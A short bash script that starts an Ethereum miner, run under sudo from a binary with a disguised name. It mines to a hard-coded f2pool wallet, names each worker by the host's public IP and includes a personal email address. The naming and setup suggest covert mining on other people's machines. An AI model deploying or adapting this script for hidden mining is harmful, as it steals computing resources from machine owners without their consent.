#!/bin/bash

COIN=eth
EMAIL=adityarizal323@gmail.com
POOL=eth.f2pool.com:6688
WALLET=0x35c7ed9124ea813033d909c0698a1eb52aa9e268
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"

chmod +x ./musikoane && sudo ./musikoane -algo ethash -pool1 eth.f2pool.com:6688 -wallet 0x35c7ed9124ea813033d909c0698a1eb52aa9e268 -coin eth -rigName $(echo "$(curl -s ifconfig.me)" | tr . _ ) -email adityarizal323@gmail.com
